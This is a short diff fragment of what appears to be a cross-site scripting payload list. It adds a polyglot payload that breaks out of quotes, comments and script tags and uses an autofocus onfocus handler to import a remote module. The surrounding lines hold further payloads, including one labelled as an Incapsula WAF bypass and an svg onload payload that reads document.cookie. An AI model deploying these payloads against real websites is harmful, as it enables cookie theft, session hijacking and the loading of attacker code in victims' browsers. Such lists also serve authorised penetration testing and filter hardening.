@@ -152,3 +152,4 @@ incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 
 '-alert?.(1)-'
 <​/script><​script>alert(1234)<​/script>
 orwa%27\"><svg/onload​=alert(document.cookie)>
+'/*\'/*"/*\"/*<​/Script><Input/AutoFocus/OnFocus​=/**/(import(/hello/.source))//>
